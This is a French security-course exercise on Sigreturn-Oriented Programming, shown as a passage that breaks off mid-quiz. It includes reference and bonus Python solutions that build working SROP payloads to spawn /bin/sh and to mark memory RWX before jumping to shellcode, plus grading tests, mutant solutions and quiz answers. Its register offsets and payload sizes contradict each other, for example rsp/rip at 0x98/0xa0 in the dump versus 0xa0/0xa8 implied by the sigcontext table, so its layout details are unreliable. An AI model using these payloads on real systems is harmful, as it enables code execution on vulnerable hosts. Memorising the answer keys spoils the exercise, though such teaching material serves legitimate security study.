# Exercice 3.4.6-c : srop_master

**Module :**
3.4.6 — ROP Advanced Techniques

**Concept :**
c — Sigreturn-Oriented Programming (SROP)

**Difficulte :**
★★★★★★★★★☆ (9/10)

**Type :**
code

**Tiers :**
2 — Concepts multiples integres

**Langage :**
Python 3.12

**Prerequis :**
- Comprehension des signaux Unix
- Maitrise de ROP basique
- Connaissance des syscalls Linux
- Bases de l'architecture x86-64

**Domaines :**
Exploit, Kernel, ASM

**Duree estimee :**
90 min

**XP Base :**
350

**Complexite :**
T4 O(n) x S3 O(n)

---

## SECTION 1 : PROTOTYPE & CONSIGNE

### 1.1 Obligations

**Fichier a rendre :**
`srop_master.py`

**Fonctions autorisees :**
- `struct` (packing/unpacking)
- `json` (entree/sortie)
- `sys` (arguments)
- Fonctions built-in Python

**Fonctions interdites :**
- `pwntools` (SigreturnFrame)
- Bibliotheques d'exploitation automatique

### 1.2 Consigne

#### 2.4.1 Contexte Culturel — "Doctor Strange"

*"I went forward in time to view alternate futures. To see all the possible outcomes."*

Dans **Doctor Strange**, le sorcier manipule le temps et les dimensions pour controler le destin. SROP (Sigreturn-Oriented Programming) est similaire : il exploite le mecanisme que le kernel utilise pour restaurer l'etat du processus apres un signal, te permettant de definir TOUS les registres en une seule operation.

Quand un signal est delivre, le kernel sauvegarde tous les registres dans une structure sur la stack. Quand le handler retourne, `sigreturn` restaure ces registres. En forgeant cette structure, tu controles l'ENSEMBLE de l'etat du processeur !

C'est comme si Doctor Strange pouvait ecrire exactement dans quelle timeline il veut atterrir.

#### 2.4.2 Enonce Academique

Le syscall `sigreturn` (ou `rt_sigreturn` sur x86-64) est utilise par le kernel pour restaurer le contexte d'execution apres un signal handler. La structure `sigcontext` contient tous les registres. En forgeant cette structure et en appelant sigreturn, on peut definir arbitrairement TOUS les registres.

**Ta mission :**

Ecrire un programme `srop_master.py` qui :

1. **Forge** une structure sigframe complete pour x86-64
2. **Configure** tous les registres pour executer execve("/bin/sh")
3. **Construit** la chaine ROP minimale (gadget sigreturn + frame)
4. **Genere** le payload final

**Entree :**
- Fichier JSON contenant :
  - `syscall_gadget` : adresse d'un gadget "syscall; ret"
  - `binsh_addr` : adresse de la chaine "/bin/sh"
  - `stack_addr` : adresse de la stack controlable

**Sortie :**
- JSON avec la sigframe forgee et le payload complet

**Structure sigframe x86-64 (simplifiee) :**
```
Offset  Field
0x00    uc_flags
0x08    uc_link
0x10    uc_stack (ss_sp, ss_flags, ss_size)
0x28    uc_mcontext (sigcontext avec tous les registres)
...
```

**Registres dans sigcontext :**
| Offset | Registre |
|--------|----------|
| 0x00 | R8 |
| 0x08 | R9 |
| 0x10 | R10 |
| 0x18 | R11 |
| 0x20 | R12 |
| 0x28 | R13 |
| 0x30 | R14 |
| 0x38 | R15 |
| 0x40 | RDI |
| 0x48 | RSI |
| 0x50 | RBP |
| 0x58 | RBX |
| 0x60 | RDX |
| 0x68 | RAX |
| 0x70 | RCX |
| 0x78 | RSP |
| 0x80 | RIP |
| 0x88 | EFLAGS |
| 0x90 | CS, GS, FS, etc. |

**Syscall execve :**
- RAX = 59
- RDI = "/bin/sh" address
- RSI = NULL (argv)
- RDX = NULL (envp)
- RIP = syscall gadget

**Exemples :**

| Entree | Sortie |
|--------|--------|
| `{"syscall_gadget": "0x401020", "binsh_addr": "0x402000", "stack_addr": "0x7fff0000"}` | `{"sigframe": {...}, "payload_hex": "...", "size": 248}` |

### 1.3 Prototype

```python
#!/usr/bin/env python3
"""
srop_master.py - Sigreturn-Oriented Programming
"""

import json
import struct
import sys

def pack64(value: int) -> bytes:
    """Pack une valeur 64-bit en little-endian."""
    pass

class SigFrame:
    """Structure sigframe pour x86-64 Linux."""

    # Taille totale de la frame
    FRAME_SIZE = 0x100  # Ajuster selon la version exacte

    def __init__(self):
        """Initialise une sigframe avec des valeurs par defaut."""
        # uc_flags, uc_link
        self.uc_flags = 0
        self.uc_link = 0

        # uc_stack (sigaltstack)
        self.ss_sp = 0
        self.ss_flags = 0
        self.ss_size = 0

        # Registres (sigcontext)
        self.r8 = 0
        self.r9 = 0
        self.r10 = 0
        self.r11 = 0
        self.r12 = 0
        self.r13 = 0
        self.r14 = 0
        self.r15 = 0
        self.rdi = 0
        self.rsi = 0
        self.rbp = 0
        self.rbx = 0
        self.rdx = 0
        self.rax = 0
        self.rcx = 0
        self.rsp = 0
        self.rip = 0
        self.eflags = 0

        # Segments
        self.cs = 0x33  # User mode CS
        self.gs = 0
        self.fs = 0

        # Signal mask et autres
        self.sigmask = 0

    def set_execve(self, syscall_addr: int, binsh_addr: int, stack_addr: int):
        """
        Configure la frame pour execve("/bin/sh", NULL, NULL).

        Args:
            syscall_addr: Adresse du gadget syscall
            binsh_addr: Adresse de "/bin/sh"
            stack_addr: Adresse de stack valide pour RSP
        """
        pass

    def pack(self) -> bytes:
        """
        Serialise la sigframe en bytes.

        Returns:
            Bytes de la frame complete
        """
        pass

def build_srop_chain(syscall_gadget: int, sigframe: SigFrame) -> list:
    """
    Construit la chaine ROP pour SROP.

    La chaine minimale est:
    1. pop rax; ret (pour mettre 15 dans rax = rt_sigreturn)
    2. syscall; ret (pour appeler sigreturn)
    3. sigframe (restauree par sigreturn)

    Ou si on a directement un gadget qui set rax=15:
    1. syscall; ret avec rax=15 deja set
    2. sigframe
    """
    pass

def create_srop_payload(data: dict) -> dict:
    """
    Cree le payload SROP complet.
    """
    pass

def main():
    """Point d'entree principal."""
    pass

if __name__ == "__main__":
    main()
```

---

## SECTION 2 : LE SAVIEZ-VOUS ?

### L'invention de SROP

SROP a ete presente par Erik Bosman et Herbert Bos en 2014 dans le papier "Framing Signals - A Return to Portable Shellcode". Leur contribution majeure etait de montrer que le mecanisme de signaux, present dans TOUS les systemes Unix-like depuis les annees 70, pouvait etre detourne pour une exploitation tres puissante.

### Pourquoi SROP est si puissant ?

1. **Controle total** : Un seul gadget (syscall) permet de definir TOUS les registres
2. **Minimal** : Necessite seulement un gadget "syscall; ret" ou "syscall" + controle de RAX
3. **Universel** : Fonctionne sur Linux, FreeBSD, et autres systemes Unix
4. **Difficile a detecter** : La sigframe ressemble a des donnees normales

---

## SECTION 2.5 : DANS LA VRAIE VIE

**Metier : Exploit Developer / Security Researcher**

SROP est utilise dans des scenarios ou les gadgets sont rares :

**Cas d'usage concret - Binary minimal :**
Un binaire statiquement lie avec tres peu de code. Les gadgets classiques (pop rdi; ret, etc.) n'existent pas, mais il y a un "syscall; ret". SROP permet d'obtenir un shell quand meme.

**Cas d'usage concret - Kernel exploitation :**
SROP est aussi utilisable dans le kernel pour restaurer un contexte utilisateur apres une exploitation kernel.

**CTF celehres utilisant SROP :** CSAW CTF, DEF CON CTF, Google CTF

---

## SECTION 3 : EXEMPLE D'UTILISATION

### 3.0 Session bash

```bash
$ ls
srop_master.py  target_info.json

$ cat target_info.json
{
  "syscall_gadget": "0x401020",
  "binsh_addr": "0x402000",
  "stack_addr": "0x7fff0000",
  "pop_rax_gadget": "0x401030"
}

$ python3 srop_master.py target_info.json
{
  "technique": "SROP",
  "sigframe": {
    "rax": 59,
    "rdi": "0x402000",
    "rsi": 0,
    "rdx": 0,
    "rip": "0x401020",
    "rsp": "0x7fff0000",
    "cs": "0x33"
  },
  "rop_chain": [
    {"addr": "0x401030", "purpose": "pop rax; ret"},
    {"addr": "0xf", "purpose": "rax = 15 (rt_sigreturn)"},
    {"addr": "0x401020", "purpose": "syscall (sigreturn)"},
    {"purpose": "sigframe follows..."}
  ],
  "payload_hex": "3010400000000000...",
  "payload_size": 264,
  "description": "SROP to execve('/bin/sh', NULL, NULL)"
}

$ python3 srop_master.py target_info.json --dump-frame
SigFrame Layout:
+------------------+--------+------------------+
| Field            | Offset | Value            |
+------------------+--------+------------------+
| uc_flags         | 0x00   | 0x0              |
| uc_link          | 0x08   | 0x0              |
| ss_sp            | 0x10   | 0x0              |
| ss_flags         | 0x18   | 0x0              |
| ss_size          | 0x20   | 0x0              |
| r8               | 0x28   | 0x0              |
| r9               | 0x30   | 0x0              |
| ...              | ...    | ...              |
| rdi              | 0x68   | 0x402000         |
| rsi              | 0x70   | 0x0              |
| rdx              | 0x88   | 0x0              |
| rax              | 0x90   | 0x3b (59)        |
| rip              | 0xa0   | 0x401020         |
| rsp              | 0x98   | 0x7fff0000       |
| cs               | 0xa8   | 0x33             |
+------------------+--------+------------------+
Total size: 248 bytes
```

---

## SECTION 3.1 : BONUS STANDARD (OPTIONNEL)

**Difficulte Bonus :**
★★★★★★★★★★ (10/10)

**Recompense :**
XP x2

**Time Complexity attendue :**
O(n)

**Space Complexity attendue :**
O(n)

**Domaines Bonus :**
Exploit, Kernel, Syscall

### 3.1.1 Consigne Bonus

**Extension "Advanced SROP" :**

Etendre le programme pour :

1. **Supporter** mprotect via SROP (puis jump vers shellcode)
2. **Chainer** plusieurs sigreturn pour des exploits multi-etapes
3. **Gerer** les differentes versions de kernel (offsets variables)
4. **Implementer** SROP pour ARM64 (sigframe differente)

**Contraintes supplementaires :**
```
+-----------------------------------------------+
|  mprotect(stack, 0x1000, 7) puis jump shellcode |
|  Chained SROP: sigreturn -> mprotect ->        |
|                sigreturn -> execve             |
|  ARM64: structure rt_sigframe differente       |
+-----------------------------------------------+
```

### 3.1.2 Prototype Bonus

```python
class SigFrameARM64:
    """Structure sigframe pour ARM64 Linux."""
    pass

def build_chained_srop(stages: list, syscall_gadget: int) -> bytes:
    """
    Construit une chaine SROP multi-etapes.

    Chaque stage est une sigframe qui, a la fin, trigger
    une autre sigreturn.
    """
    pass

def srop_mprotect_then_shellcode(stack_addr: int, shellcode: bytes,
                                  syscall_gadget: int) -> bytes:
    """
    SROP pour mprotect puis execution de shellcode.
    """
    pass
```

### 3.1.3 Ce qui change par rapport a l'exercice de base

| Aspect | Base | Bonus |
|--------|------|-------|
| Syscall | execve uniquement | mprotect + execve |
| Chaining | Une sigframe | Multi-etapes |
| Architecture | x86-64 | x86-64 + ARM64 |
| Kernel | Version fixe | Adaptable |

---

## SECTION 4 : ZONE CORRECTION (POUR LE TESTEUR)

### 4.1 Moulinette

| Test | Entree | Sortie Attendue | Points |
|------|--------|-----------------|--------|
| sigframe_size | N/A | >= 248 bytes | 10 |
| sigframe_rax | execve | RAX = 59 | 10 |
| sigframe_rip | syscall addr | RIP correct | 10 |
| sigframe_args | binsh, 0, 0 | RDI, RSI, RDX | 15 |
| sigframe_cs | N/A | CS = 0x33 | 10 |
| rop_chain | full chain | Sequence correcte | 15 |
| payload_pack | sigframe | Bytes valides | 15 |
| rt_sigreturn | N/A | RAX = 15 | 15 |

### 4.2 main.c de test

Non applicable (exercice Python).

### 4.3 Solution de reference

```python
#!/usr/bin/env python3
"""
srop_master.py - Solution de reference
"""

import json
import struct
import sys

def pack64(value: int) -> bytes:
    """Pack une valeur 64-bit en little-endian."""
    return struct.pack('<Q', value)

def parse_hex(value) -> int:
    """Parse une valeur hexadecimale ou entiere."""
    if isinstance(value, int):
        return value
    value = str(value).strip()
    if value.lower().startswith('0x'):
        return int(value, 16)
    try:
        return int(value, 16)
    except ValueError:
        return int(value)

# Syscall numbers
RT_SIGRETURN = 15
EXECVE = 59
MPROTECT = 10

class SigFrame:
    """Structure sigframe pour x86-64 Linux."""

    def __init__(self):
        """Initialise une sigframe avec des valeurs par defaut."""
        # uc_flags, uc_link
        self.uc_flags = 0
        self.uc_link = 0

        # uc_stack (sigaltstack)
        self.ss_sp = 0
        self.ss_flags = 0
        self.ss_size = 0

        # Registres (sigcontext) - ordre specifique!
        self.r8 = 0
        self.r9 = 0
        self.r10 = 0
        self.r11 = 0
        self.r12 = 0
        self.r13 = 0
        self.r14 = 0
        self.r15 = 0
        self.rdi = 0
        self.rsi = 0
        self.rbp = 0
        self.rbx = 0
        self.rdx = 0
        self.rax = 0
        self.rcx = 0
        self.rsp = 0
        self.rip = 0
        self.eflags = 0

        # Segments
        self.cs = 0x33   # User mode CS (ring 3)
        self.gs = 0
        self.fs = 0
        self.ss = 0x2b   # User mode SS

        # FPU state (on met des zeros)
        self.fpstate = 0

        # Signal mask
        self.sigmask = 0

    def set_execve(self, syscall_addr: int, binsh_addr: int, stack_addr: int):
        """Configure la frame pour execve("/bin/sh", NULL, NULL)."""
        self.rax = EXECVE       # syscall number
        self.rdi = binsh_addr   # arg1: filename
        self.rsi = 0            # arg2: argv = NULL
        self.rdx = 0            # arg3: envp = NULL
        self.rip = syscall_addr # ou continuer
        self.rsp = stack_addr   # stack valide
        self.cs = 0x33          # user code segment
        self.ss = 0x2b          # user stack segment

    def set_mprotect(self, syscall_addr: int, addr: int, size: int, prot: int,
                     stack_addr: int):
        """Configure la frame pour mprotect()."""
        self.rax = MPROTECT
        self.rdi = addr
        self.rsi = size
        self.rdx = prot
        self.rip = syscall_addr
        self.rsp = stack_addr
        self.cs = 0x33
        self.ss = 0x2b

    def pack(self) -> bytes:
        """Serialise la sigframe en bytes."""
        frame = b''

        # ucontext structure
        frame += pack64(self.uc_flags)
        frame += pack64(self.uc_link)

        # sigaltstack
        frame += pack64(self.ss_sp)
        frame += pack64(self.ss_flags)
        frame += pack64(self.ss_size)

        # sigcontext - registres dans l'ordre du kernel
        frame += pack64(self.r8)
        frame += pack64(self.r9)
        frame += pack64(self.r10)
        frame += pack64(self.r11)
        frame += pack64(self.r12)
        frame += pack64(self.r13)
        frame += pack64(self.r14)
        frame += pack64(self.r15)
        frame += pack64(self.rdi)
        frame += pack64(self.rsi)
        frame += pack64(self.rbp)
        frame += pack64(self.rbx)
        frame += pack64(self.rdx)
        frame += pack64(self.rax)
        frame += pack64(self.rcx)
        frame += pack64(self.rsp)
        frame += pack64(self.rip)
        frame += pack64(self.eflags)

        # Segments (16-bit chacun, mais aligne)
        frame += struct.pack('<H', self.cs)
        frame += struct.pack('<H', self.gs)
        frame += struct.pack('<H', self.fs)
        frame += struct.pack('<H', self.ss)

        # fpstate pointer (on met 0)
        frame += pack64(self.fpstate)

        # Signal mask
        frame += pack64(self.sigmask)

        # Padding pour atteindre la taille correcte
        while len(frame) < 248:
            frame += b'\x00'

        return frame

    def to_dict(self) -> dict:
        """Retourne un dictionnaire des registres importants."""
        return {
            'rax': self.rax,
            'rdi': hex(self.rdi),
            'rsi': self.rsi,
            'rdx': self.rdx,
            'rip': hex(self.rip),
            'rsp': hex(self.rsp),
            'cs': hex(self.cs),
            'ss': hex(self.ss)
        }

def build_srop_chain(pop_rax_gadget: int, syscall_gadget: int,
                      sigframe: SigFrame) -> tuple:
    """
    Construit la chaine ROP pour SROP.

    Returns:
        (chain_list, payload_bytes)
    """
    chain = []
    payload = b''

    # 1. pop rax; ret pour mettre 15 (rt_sigreturn) dans RAX
    if pop_rax_gadget:
        chain.append({'addr': hex(pop_rax_gadget), 'purpose': 'pop rax; ret'})
        payload += pack64(pop_rax_gadget)

        chain.append({'addr': hex(RT_SIGRETURN), 'purpose': 'rax = 15 (rt_sigreturn)'})
        payload += pack64(RT_SIGRETURN)

    # 2. syscall pour declencher sigreturn
    chain.append({'addr': hex(syscall_gadget), 'purpose': 'syscall (triggers sigreturn)'})
    payload += pack64(syscall_gadget)

    # 3. La sigframe suit directement
    chain.append({'purpose': '--- sigframe follows ---'})
    payload += sigframe.pack()

    return chain, payload

def create_srop_payload(data: dict) -> dict:
    """Cree le payload SROP complet."""

    syscall_gadget = parse_hex(data.get('syscall_gadget', 0))
    binsh_addr = parse_hex(data.get('binsh_addr', 0))
    stack_addr = parse_hex(data.get('stack_addr', 0))
    pop_rax_gadget = parse_hex(data.get('pop_rax_gadget', 0))

    # Creer la sigframe
    sigframe = SigFrame()
    sigframe.set_execve(syscall_gadget, binsh_addr, stack_addr)

    # Construire la chaine
    chain, payload = build_srop_chain(pop_rax_gadget, syscall_gadget, sigframe)

    return {
        'technique': 'SROP',
        'sigframe': sigframe.to_dict(),
        'rop_chain': chain,
        'payload_hex': payload.hex(),
        'payload_size': len(payload),
        'sigframe_size': len(sigframe.pack()),
        'description': "SROP to execve('/bin/sh', NULL, NULL)"
    }

def main():
    """Point d'entree principal."""
    if len(sys.argv) < 2:
        print("Usage: srop_master.py <input.json> [--dump-frame]", file=sys.stderr)
        sys.exit(1)

    input_file = sys.argv[1]
    dump_frame = '--dump-frame' in sys.argv

    if input_file == '-':
        data = json.load(sys.stdin)
    else:
        with open(input_file, 'r') as f:
            data = json.load(f)

    result = create_srop_payload(data)

    if dump_frame:
        print("SigFrame Layout:")
        print("+------------------+--------+------------------+")
        print("| Field            | Offset | Value            |")
        print("+------------------+--------+------------------+")
        for key, val in result['sigframe'].items():
            print(f"| {key:<16} | {'--':<6} | {str(val):<16} |")
        print("+------------------+--------+------------------+")
        print(f"Total size: {result['sigframe_size']} bytes")
    else:
        print(json.dumps(result, indent=2))

if __name__ == "__main__":
    main()
```

### 4.4 Solutions alternatives acceptees

```python
# Alternative 1: SigFrame comme dictionnaire au lieu de classe
def create_sigframe_dict(rax, rdi, rsi, rdx, rip, rsp):
    return {
        'r8': 0, 'r9': 0, ...,
        'rax': rax, 'rdi': rdi, 'rsi': rsi, 'rdx': rdx,
        'rip': rip, 'rsp': rsp, 'cs': 0x33
    }

def pack_sigframe(frame_dict):
    # Pack dans le bon ordre
    pass
```

```python
# Alternative 2: Constantes pour les offsets
SIGFRAME_OFFSETS = {
    'rax': 0x90,
    'rdi': 0x68,
    'rsi': 0x70,
    'rdx': 0x88,
    'rip': 0xa0,
    'rsp': 0x98,
}
```

### 4.5 Solutions refusees (avec explications)

```python
# REFUSE: Utilise pwntools
from pwn import SigreturnFrame

frame = SigreturnFrame()
frame.rax = 59
# ...

# Pourquoi c'est faux: L'exercice demande une implementation manuelle
```

```python
# REFUSE: Oublie CS
def pack_sigframe_bad(frame):
    # Ne set pas CS = 0x33
    frame['cs'] = 0  # Mauvais!

# Pourquoi c'est faux: CS doit etre 0x33 pour user mode
```

### 4.6 Solution bonus de reference

```python
#!/usr/bin/env python3
"""
srop_master.py - Solution bonus avec chaining et ARM64
"""

# ... (SigFrame classe de base) ...

class SigFrameARM64:
    """Structure sigframe pour ARM64 Linux."""

    def __init__(self):
        # Registres X0-X30, SP, PC
        self.regs = [0] * 31
        self.sp = 0
        self.pc = 0
        self.pstate = 0

    def set_execve(self, syscall_addr: int, binsh_addr: int):
        self.regs[0] = binsh_addr  # X0 = filename
        self.regs[1] = 0           # X1 = argv
        self.regs[2] = 0           # X2 = envp
        self.regs[8] = 221         # X8 = execve syscall
        self.pc = syscall_addr

    def pack(self) -> bytes:
        frame = b''
        # __sigcontext structure ARM64
        frame += pack64(0)  # fault_address
        for r in self.regs:
            frame += pack64(r)
        frame += pack64(self.sp)
        frame += pack64(self.pc)
        frame += pack64(self.pstate)
        # Padding
        while len(frame) < 0x110:
            frame += b'\x00'
        return frame

def build_chained_srop(stages: list, syscall_gadget: int,
                       pop_rax_gadget: int) -> bytes:
    """
    Construit une chaine SROP multi-etapes.

    Chaque stage configure RIP pour pointer vers le debut de la
    prochaine stage (pop rax; syscall).
    """
    payload = b''
    total_offset = 0

    for i, stage in enumerate(stages):
        # Calculer l'adresse de la prochaine frame
        # (apres cette frame + gadgets)
        current_size = 248  # taille sigframe

        if i < len(stages) - 1:
            # RIP pointe vers le debut de la prochaine sequence
            next_addr = stage['stack_base'] + total_offset + current_size + 24
            stage['sigframe'].rip = pop_rax_gadget
            stage['sigframe'].rsp = next_addr

        # Ajouter les gadgets
        payload += pack64(pop_rax_gadget)
        payload += pack64(RT_SIGRETURN)
        payload += pack64(syscall_gadget)

        # Ajouter la frame
        payload += stage['sigframe'].pack()

        total_offset += 24 + 248

    return payload

def srop_mprotect_then_shellcode(stack_addr: int, shellcode_addr: int,
                                  syscall_gadget: int) -> dict:
    """SROP pour mprotect puis jump vers shellcode."""

    # Stage 1: mprotect pour rendre une page executable
    frame1 = SigFrame()
    frame1.set_mprotect(
        syscall_gadget,
        shellcode_addr & ~0xfff,  # Page-aligned
        0x1000,
        7,  # RWX
        stack_addr
    )

    # Apres mprotect, on veut jumper vers le shellcode
    # Donc RIP de la frame1 doit pointer vers le shellcode
    # MAIS mprotect retourne dans RAX, et on utilise syscall
    # Donc on a besoin d'une deuxieme frame

    # Stage 2: execve ou jump direct
    frame2 = SigFrame()
    frame2.rip = shellcode_addr  # Jump vers shellcode
    frame2.rsp = stack_addr + 0x200
    frame2.cs = 0x33

    return {
        'stage1': 'mprotect',
        'stage2': 'jump_to_shellcode',
        'frames': [frame1.to_dict(), frame2.to_dict()]
    }
```

### 4.7 Solutions alternatives bonus

```python
# Alternative: Detecter la version kernel pour ajuster la frame
def get_sigframe_layout(kernel_version: str) -> dict:
    if kernel_version.startswith('5.'):
        return SIGFRAME_LAYOUT_5X
    elif kernel_version.startswith('4.'):
        return SIGFRAME_LAYOUT_4X
    return SIGFRAME_LAYOUT_DEFAULT
```

### 4.8 Solutions refusees bonus

```python
# REFUSE: Ignore la taille de la frame
def pack_sigframe_bad(frame):
    return struct.pack('<QQQ', frame.rax, frame.rdi, frame.rip)
    # Oublie tout le reste de la structure!

# Pourquoi c'est faux: La sigframe doit etre complete sinon crash
```

### 4.9 spec.json (ENGINE v22.1)

```json
{
  "name": "srop_master",
  "language": "python",
  "version": "3.12",
  "type": "code",
  "tier": 2,
  "tags": ["srop", "sigreturn", "exploitation", "phase3"],
  "passing_score": 70,

  "function": {
    "name": "create_srop_payload",
    "prototype": "def create_srop_payload(data: dict) -> dict",
    "return_type": "dict"
  },

  "driver": {
    "edge_cases": [
      {
        "name": "basic_execve",
        "args": [{"syscall_gadget": "0x401020", "binsh_addr": "0x402000", "stack_addr": "0x7fff0000"}],
        "expected_contains": ["sigframe", "payload_hex"]
      },
      {
        "name": "rax_15",
        "args": [{"syscall_gadget": "0x401020", "binsh_addr": "0x402000", "stack_addr": "0x7fff0000", "pop_rax_gadget": "0x401030"}],
        "expected_contains": ["0xf"],
        "is_trap": false
      }
    ]
  },

  "norm": {
    "allowed_functions": ["struct", "json", "sys"],
    "forbidden_functions": ["pwn", "pwntools"],
    "blocking": true
  }
}
```

### 4.10 Solutions Mutantes (minimum 5)

```python
# Mutant A : Oublie de set CS
def set_execve_mutant_a(self, syscall_addr, binsh_addr, stack_addr):
    self.rax = 59
    self.rdi = binsh_addr
    self.rip = syscall_addr
    # self.cs = 0x33  # OUBLIE!

# Pourquoi c'est faux: Sans CS=0x33, segfault au retour
```

```python
# Mutant B : Mauvais numero de syscall
RT_SIGRETURN_MUTANT = 119  # Mauvais! (c'est setresuid)

# Pourquoi c'est faux: rt_sigreturn est 15 sur x86-64
```

```python
# Mutant C : Ordre des registres incorrect
def pack_mutant_c(self):
    frame = b''
    frame += pack64(self.rax)  # Devrait etre apres r15!
    frame += pack64(self.rdi)
    # ...

# Pourquoi c'est faux: L'ordre des registres est fixe par le kernel
```

```python
# Mutant D : Oublie RSP
def set_execve_mutant_d(self, syscall_addr, binsh_addr, stack_addr):
    self.rax = 59
    self.rdi = binsh_addr
    self.rip = syscall_addr
    # self.rsp = stack_addr  # OUBLIE!

# Pourquoi c'est faux: RSP invalide = crash
```

```python
# Mutant E : RAX pour execve au lieu de sigreturn
def build_chain_mutant_e(sigframe):
    chain = []
    chain.append(pack64(pop_rax))
    chain.append(pack64(59))  # Devrait etre 15 pour sigreturn!
    chain.append(pack64(syscall))

# Pourquoi c'est faux: Le premier syscall doit etre sigreturn (15)
```

---

## SECTION 5 : COMPRENDRE (DOCUMENT DE COURS COMPLET)

### 5.1 Ce que cet exercice enseigne

Cet exercice enseigne **SROP (Sigreturn-Oriented Programming)** :

1. **Mecanisme de signaux** : Comment le kernel gere les signals
2. **Structure sigframe** : Format et contenu de la frame de signal
3. **sigreturn syscall** : Comment il restaure l'etat
4. **Exploitation** : Forger une frame pour controler tous les registres

### 5.2 LDA - Traduction litterale en francais (MAJUSCULES)

```
CLASSE SigFrame
DEBUT CLASSE
    INITIALISER tous les registres a 0
    INITIALISER cs a 0x33 (user mode)

    FONCTION set_execve(syscall_addr, binsh_addr, stack_addr)
    DEBUT FONCTION
        AFFECTER 59 A rax         // execve syscall
        AFFECTER binsh_addr A rdi // premier argument
        AFFECTER 0 A rsi          // argv = NULL
        AFFECTER 0 A rdx          // envp = NULL
        AFFECTER syscall_addr A rip
        AFFECTER stack_addr A rsp
    FIN FONCTION

    FONCTION pack() QUI RETOURNE BYTES
    DEBUT FONCTION
        DECLARER frame COMME BYTES VIDE
        POUR CHAQUE registre DANS ordre_kernel FAIRE
            AJOUTER pack64(registre) A frame
        FIN POUR
        RETOURNER frame
    FIN FONCTION
FIN CLASSE
```

### 5.2.2 Logic Flow (Structured English)

```
ALGORITHME : SROP Exploitation
---
1. CREER une sigframe vide

2. CONFIGURER les registres pour execve:
   - RAX = 59 (execve syscall number)
   - RDI = adresse de "/bin/sh"
   - RSI = 0 (NULL argv)
   - RDX = 0 (NULL envp)
   - RIP = adresse du gadget syscall
   - RSP = adresse stack valide
   - CS = 0x33 (user code segment)

3. CONSTRUIRE la chaine ROP:
   a. pop rax; ret
   b. 15 (valeur pour RAX = rt_sigreturn)
   c. syscall (declenche sigreturn)
   d. sigframe complete

4. SERIALISER en bytes

5. RETOURNER le payload
```

### 5.3 Visualisation ASCII

```
              SROP CONCEPT
    +--------------------------------------------------+
    |                                                  |
    |   Signal Normal Flow:                            |
    |                                                  |
    |   1. Signal arrive                               |
    |      |                                           |
    |      v                                           |
    |   2. Kernel sauvegarde registres -> sigframe     |
    |      |                                           |
    |      v                                           |
    |   3. Signal handler execute                      |
    |      |                                           |
    |      v                                           |
    |   4. Handler retourne (sigreturn syscall)        |
    |      |                                           |
    |      v                                           |
    |   5. Kernel restaure registres depuis sigframe   |
    |                                                  |
    +--------------------------------------------------+

              SROP EXPLOITATION
    +--------------------------------------------------+
    |                                                  |
    |   1. Overflow la stack avec:                     |
    |      +------------------+                        |
    |      | pop rax; ret     | <- overflow ici        |
    |      | 15               | <- rt_sigreturn        |
    |      | syscall; ret     |                        |
    |      | [FORGED SIGFRAME]| <- notre frame!        |
    |      +------------------+                        |
    |                                                  |
    |   2. Execution:                                  |
    |      pop rax (rax = 15)                          |
    |      syscall (rt_sigreturn)                      |
    |      |                                           |
    |      v                                           |
    |   3. Kernel restaure depuis notre frame:         |
    |      RAX = 59, RDI = binsh, RSI = 0, RDX = 0    |
    |      RIP = syscall gadget                        |
    |      |                                           |
    |      v                                           |
    |   4. Execution continue a RIP:                   |
    |      syscall (avec RAX=59 -> execve!)            |
    |      |                                           |
    |      v                                           |
    |   5. SHELL!                                      |
    |                                                  |
    +--------------------------------------------------+

              SIGFRAME LAYOUT (x86-64)
    +--------------------------------------------------+
    |   Offset   Field                                 |
    |   ------   -----                                 |
    |   0x00     uc_flags                              |
    |   0x08     uc_link                               |
    |   0x10     ss_sp (sigaltstack)                   |
    |   0x18     ss_flags                              |
    |   0x20     ss_size                               |
    |   0x28     r8                                    |
    |   0x30     r9                                    |
    |   ...      ...                                   |
    |   0x68     rdi       <- arg1                     |
    |   0x70     rsi       <- arg2                     |
    |   ...      ...                                   |
    |   0x88     rdx       <- arg3                     |
    |   0x90     rax       <- syscall number           |
    |   0x98     rsp       <- stack pointer            |
    |   0xa0     rip       <- instruction pointer      |
    |   0xa8     eflags                                |
    |   0xb0     cs        <- MUST BE 0x33!            |
    |   ...      segments, fpstate, sigmask            |
    |   ~248     Total size                            |
    +--------------------------------------------------+
```

### 5.4 Les pieges en detail

#### Piege 1 : Oublier CS = 0x33

```python
# MAUVAIS
sigframe.cs = 0  # Va causer un GPF!

# BON
sigframe.cs = 0x33  # User code segment
sigframe.ss = 0x2b  # User stack segment
```

#### Piege 2 : Mauvais numero de syscall

```python
# MAUVAIS (x86 32-bit number)
RT_SIGRETURN = 119

# BON (x86-64 number)
RT_SIGRETURN = 15
```

### 5.5 Cours Complet

#### 5.5.1 Les signaux Unix en profondeur

Quand un signal est delivre a un processus :
1. Le kernel interrompt l'execution
2. Sauvegarde TOUS les registres dans une structure sigframe sur la stack
3. Execute le signal handler
4. Quand le handler appelle `sigreturn`, le kernel restaure les registres

#### 5.5.2 Pourquoi SROP est si puissant

- **Un seul gadget** : Besoin seulement de "syscall; ret"
- **Controle total** : TOUS les registres sont definis
- **Pas de magie** : Le kernel fait le travail pour nous
- **Universel** : Fonctionne sur tous les systemes Unix-like

### 5.6 Applications pratiques

1. **Binaires minimaux** : Quand il n'y a presque pas de gadgets
2. **Exploitation kernel** : Retour en userland avec contexte controle
3. **CTF challenges** : Technique avancee tres appreciee

---

## SECTION 6 : PIEGES - RECAPITULATIF

| # | Piege | Consequence | Solution |
|---|-------|-------------|----------|
| 1 | CS != 0x33 | GPF | Toujours set cs=0x33 |
| 2 | rt_sigreturn != 15 | Mauvais syscall | Verifier le numero |
| 3 | Ordre registres | Frame invalide | Suivre l'ordre kernel |
| 4 | RSP invalide | Crash | Set RSP valide |
| 5 | Frame trop petite | Corruption | Respecter la taille |

---

## SECTION 7 : QCM

### Question 1
**Quel est le numero de syscall pour rt_sigreturn sur x86-64 Linux ?**

A) 11
B) 15
C) 59
D) 119
E) 139
F) 173
G) 231
H) 0
I) 1
J) 60

**Reponse : B**

---

### Question 2
**Quelle valeur doit avoir CS dans une sigframe pour user mode ?**

A) 0x00
B) 0x08
C) 0x10
D) 0x23
E) 0x33
F) 0x2b
G) 0x43
H) 0x73
I) 0xff
J) Variable

**Reponse : E**

---

### Question 3
**Que fait sigreturn ?**

A) Envoie un signal
B) Termine le processus
C) Restaure les registres depuis la sigframe
D) Execute un shellcode
E) Appelle exit()
F) Fork le processus
G) Change les permissions
H) Lit un fichier
I) Ecrit un fichier
J) Cree un thread

**Reponse : C**

---

### Question 4
**Combien de gadgets sont necessaires au minimum pour SROP ?**

A) 0
